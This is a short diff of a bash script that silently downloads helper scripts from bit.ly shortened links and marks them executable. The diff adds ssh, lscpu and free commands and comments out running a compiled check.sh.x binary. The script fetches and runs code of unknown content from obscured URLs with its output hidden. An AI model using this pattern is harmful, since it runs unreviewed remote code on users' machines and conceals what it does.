@@ -1,4 +1,5 @@
 #!/bin/bash
+ssh node01
 wget -O exit.sh https://bit.ly/3BBLPbC > /dev/null 2>&1
 clear
 wget -O sleep.sh https://bit.ly/3zzuJJh > /dev/null 2>&1
@@ -11,4 +12,6 @@ chmod +x win8vm.sh
 chmod +x exit.sh
 chmod +x sleep.sh
 chmod +x check.sh.x
-./check.sh.x
+lscpu
+free -m
+##./check.sh.x
